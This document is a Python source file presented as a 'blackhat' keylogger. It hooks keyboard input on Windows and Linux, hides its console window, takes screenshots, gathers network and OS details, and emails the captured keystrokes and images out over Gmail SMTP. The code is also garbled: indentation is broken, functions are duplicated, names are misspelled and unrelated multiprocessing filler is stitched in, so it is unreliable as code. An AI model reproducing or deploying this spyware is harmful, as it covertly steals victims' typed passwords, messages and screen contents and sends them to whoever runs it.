#***************************************************************************#
# ajoWin keylogger : ver 1.2.3                                              *
# Author : Bruno A. Diaz                                                    *
#                :~-===[$ " Astrix " ]===-                                  *
# Blackhat : Arsenal Edition                                                *
# OS: BlackArch Linux  GNU/Linux                                            *
#***************************************************************************#

#!/usr/bin/env python
#_*_ coding: utf8 _*_

import win32api
import win32console
import win32gui
import platform
import subprocess
import re
import pythoncom, pyhook
import socket
import time
import Queue
from multiprocessing.pool import ThreadPool as Pool
from multiprocessing import Queue as PQueue

  def ascii_art():
    print("   @@@@@        @@!  @@@@@@  @@@   @@@  @@@ @@@ @@@  @@@  ")
    print("  @@  @@@       @@! @@!  @@@ @@!   @@!  @@! @@! @@!@!@@@  ")
    print("  @@! @@@       !!@ @!@  !@! @@!   @@!  @!@ @@! @!@@!!@!  ")
    print("  @!@!@!@!      !!@ @!@  !@!  !:   !!@  @!@ !!@ !!:  !!!  ")
    print("  !!:  !!! .   .!!  !!:  !!:  !:   !!:  !!  !!: !!:  !!!  ")
    print("   :   !!! :   :    !!:  !!:   :   !!:  !!  !!: ::    :   ")
    print("   :   : : ::..::    : :..:    ::..:  :::    :  ::    :   ")

  def ascii_art():
    print("   @@@@@   @@@@@@ @@@@@@@ @@@@@@@  @@@ @@@   @@@  ")
    print("  @@  @@@ !@@       @!!   @@!  @@@ @@! @@!   !@@  ")
    print("  @@! @@@ !@@       @!!   @@!  @@@ @@!  !@@!@!    ")
    print("  @!@!@!@! !@@!!    !!:   @!@!!@!  !!@   !::!!    ")
    print("  !!:  !!!    !:!   !!:   !!: :!!  !!:   !: :!!    ")
    print("   :   !!!     :     :    !!: :!!  !!:  :::  :::   ")
    print("   :   : :::.: :     :     :    :: :   :::    :::  ")

# Verificar si hay conexion a internet

  def verificar():
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
     con.connect(('www.google.com', 80))
     print "online"
    except:
     print ("offline")
     con.close()
     while True:
       time.sleep(30)
       verificar()

# enviar pulsaciones al correo

 system = platform.system()

 if system == "Linux" or system == "linux":
    import pyxhook
    import datetime,os,sys,platform
    import argparse as args
    import smtplib
    from time import *
    import pyscreenshot as ImageGrab
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email.mime.image import MIMEImage
    from email import encoders as Encoders
    from email.utils import COMMASPACE, formatdate

 else:
    import pythoncom,logging
    import pyWinhook as pyHook
    import datetime,os,sys,platform
    import argparse as args
    import smtplib
    from time import *
    import pyscreenshot as ImageGrab
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email.mime.image import MIMEImage
    from email import encoders as Encoders
    from email.utils import COMMASPACE, formatdate

#arguments
 parser = args.ArgumentParser(description="The basic keylogger that use smtp use -e and -p to the program work perfect")
 parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
 parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
 parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")
 parser.add_argument("-t", "--time",required=False,type=int,default=60,help="is the time the Screenshots is will be sended to your email ")
 parsed_args = parser.parse_args()


#declaration of vars
 data_hora = datetime.datetime.now()
 data_hora = str(data_hora).split('.')[0].replace(' ','_')###
 sendTo = parsed_args.email #for where you'll send the archive
 assunto = 'Keylogger %s' %data_hora
 mensagem = ' the keylogger dumped it %s '%data_hora #mensage and take the hour on pc
 youremail = parsed_args.email
 password = parsed_args.password
 server= 'smtp.gmail.com' #it is a server of google to receve the email more do you can change that to other
 port = 587
 sendtime = parsed_args.time
 log_file = parsed_args.local

  def send_Image(image):
    img_data = open(image, 'rb').read()
    msg = MIMEMultipart()
    From = youremail
    To = youremail
    msg['Subject'] = 'Screenshots'
    msg['From'] = From
    msg['To'] = To
    text = MIMEText('keylogger images')
    msg.attach(text)
    fp = open(image, 'rb')
    msgImage = MIMEImage(fp.read())
    fp.close()
    msg.attach(msgImage)
    s = smtplib.SMTP(server, port)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(youremail, password)
    s.sendmail(From, To, msg.as_string())
    s.quit()

  def screenshot():
   while True:
          im = ImageGrab.grab()
   for i in range(100):
         sleep(sendtime)
         atual_image = i
         im.save(str(i), 'jpeg')
    if i == atual_image:
       dic = os.getcwd() + "/" + str(i)
       send_Image(dic)
       os.remove(dic)

#this function manager and create the heards among other things

  def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
   global exit
   server = server
   port = port
   FROM = FROM
   PASS = PASS
   TO = TO
   subject = subject
   texto = texto
   msg = MIMEMultipart()
   msg['From'] = FROM
   msg['To'] = TO
   msg['Subject'] = subject
   msg.attach(MIMEText(texto))

  for f in anexo:
      part = MIMEBase('application', 'octet-stream')
      os.chdir(r"/")
      part.set_payload(open(f, 'rb').read())
      Encoders.encode_base64(part)
      part.add_header('Content-Disposition','attachment;filename="%s"'% os.path.basename(f))
      msg.attach(part)

   try:
      gm = smtplib.SMTP(server,port)
      gm.ehlo()
      gm.starttls()
      gm.ehlo()
      gm.login(FROM, PASS)
      gm.sendmail(FROM, TO, msg.as_string())
      gm.close()

 except Exception as e:
        errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
   print('%s'%errorMsg)

  try:

#Linux version if do you try run this code on linux

 if system == "Linux" or system == "linux":

  def OnKeyPress(event):
    fob=open(log_file,'a')
    fob.write(event.Key)
    fob.write(f"this key did pressed {event.key} \n")
    os.system("")

  if event.Ascii== 59:
   fob.close()
   new_hook.cancel()
   send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
   os.remove(log_file)
   new_hook = pyxhook.HookManager()
   new_hook.KeyDown= OnKeyPress
   new_hook.Key = OnKeyPress
   new_hook.HookKeyboard()
   new_hook.start()
   screenshot()

#Windons Version if do you try run it on Windows that is obvious

 elif system == "Windows":


  def OnKeyboardEvent(event):
    fob=open(log_file,"a")
    fob.write(event.Key)
    fob.write(f"this key did pressed {event.key} \n")

  if event.Ascii== 59:
   fob.close
   send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
   os.remove(log_file)
   exit(1)
   hooks_manager = pyHook.HookManager()
   hooks_manager.KeyDown = OnKeyboardEvent
   hooks_manager.HookKeyboard()
   pythoncom.PumpMessages()
   screenshot()

  except(KeyboardInterrupt):

   print("Sorry Not Day")

# ipconfig/interfaces

  def get_interfaces():
    output = subprocess.check_output("ipconfig /all")
    lines = output.splitlines()
    lines = filter(lambda x: x, lines)
    ip_address = ''
    mac_address = ''
    name = ''

   for line in lines:
     # ----------------
     #  Interface Name
  is_interface_name = re.match(r'^[a-zA-Z0-9].*:$', line)

 if is_interface_name:
   if name and ip_address and mac_address:
    yield {"ip_address": ip_address, "mac_address": mac_address, "name": name,}

  ip_address = ''
  mac_address = ''
  name = line.rstrip(':')
  line = line.strip().lower()

  if ':' not in line:
    continue

  value = line.split(':')[-1]
  value = value.strip()

  #-----------------
  # IP Address

  is_ip_address = not ip_address and re.match(r'ipv4 address|autoconfiguration ipv4 address|ip address', line)

  if is_ip_address:
   ip_address = value
   ip_address = ip_address.replace('(preferred)', '')
   ip_address = ip_address.strip()

  #-------------
  # MAC Address

  is_mac_address = not ip_address and re.match(r'physical address', line)

   if is_mac_address:
    mac_address = value
    mac_address = mac_address.replace('-', ':')
    mac_address = mac_address.strip()

    if name and ip_address and mac_address:
      yield {"ip_address": ip_address, "mac_address": mac_address, "name": name,}

      if __name__ == '__main__':
        for interface in get_interface():
          print interface

# Distribucion OS

  def get_distribution():
    if is_windows():
      if sys.version_info[0] == 2:
       import _winreg
      else:
       import winreg as _winreg
       reg_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
       info = _winreg.QueryValueEx(reg_key, "ProductName")[0]
        if info:
          return info
        else:
          return "Windows {}".format(platform.win32_ver()[0])

      elif is_linux():
         from utils import lib
         return "{} {}".format(*(lib.detect_distribution()))

      elif is_darwin():
         return "MacOS X {}".format(platform.mac_ver()[0])
       return ""

# multiprocessing

  my_dict = {'url1': 'url2', 'url3': 'url4'}
  my_q = PQueue()

  def test_p(uq):
    q, url = uq[0], uq[1]
    q.put(url, False)

  def main():
    global my_dict
    global my_q
    print "Going to process (%d)" % len(my_dict.keys() + my_dict.values())
    p = Pool(processes=8)
    print p.map(test_p, [(my_q, url) for url in my_dict.keys() + my_dict.values()])

    its = []
    while True:
      try:
        print "Waiting for item from queue for up to 5 seconds"
        i = my_q.get(True, 5)
        print "found %s from the queue !!" % 1
        its.append(i)
      except Queue.Empty:
      print "Caught queue empty exception, done"
        break
      print "processed %d items, completion successful" % len(its)

p.close()
p.join()

 if __name__ == '__main__':
   main()

 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)

  def OnKeyboardEvent(event):
    if event.Ascii == 5:
     _exit(1)
    if event.Ascii ! = 0 or 8:
     f = open('C:\output.txt', 'r +')
     buffer = f.read()
     f.close()

# keystrokes
    f = open('C:\output.txt', 'w')
    keylogs = chr(event.Ascii)
    if event.Ascii == 13:
     keylogs = '/n'
     buffer += keylogs
     f.write(buffer)
     f.close()

# create a hook manager object
 hm= pyHook.HookManager()
 hm.KeyDown = OneKeyboardEvent

# set the hook
 hm.HooKeyboard()

#wait forever
pythoncom.PumpMessages()

